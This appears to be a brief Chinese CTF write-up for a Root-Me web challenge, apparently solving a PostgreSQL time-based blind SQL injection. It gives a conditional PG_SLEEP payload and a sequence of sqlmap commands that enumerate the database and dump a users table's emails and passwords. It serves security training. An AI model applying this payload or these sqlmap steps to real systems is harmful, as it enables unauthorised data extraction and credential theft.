
## 方法一：延时盲注 payload

```sql
2;(SELECT (CASE WHEN ([布尔盲注注入点]) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END))--
```

------

## 方法二：sqlmap

```shell
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=2" --proxy socks5://127.0.0.1:1080
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=2" --proxy socks5://127.0.0.1:1080 --time-sec=5 --dbs
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=2" --proxy socks5://127.0.0.1:1080 --time-sec=5 --current-db
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=2" --proxy socks5://127.0.0.1:1080 --time-sec=5 -D public --tables
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=2" --proxy socks5://127.0.0.1:1080 --time-sec=5 -D public -T users --columns
sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=2" --proxy socks5://127.0.0.1:1080 --time-sec=5 -D public -T users -C id,email,usermame,password,firstname,lastname --dump
```
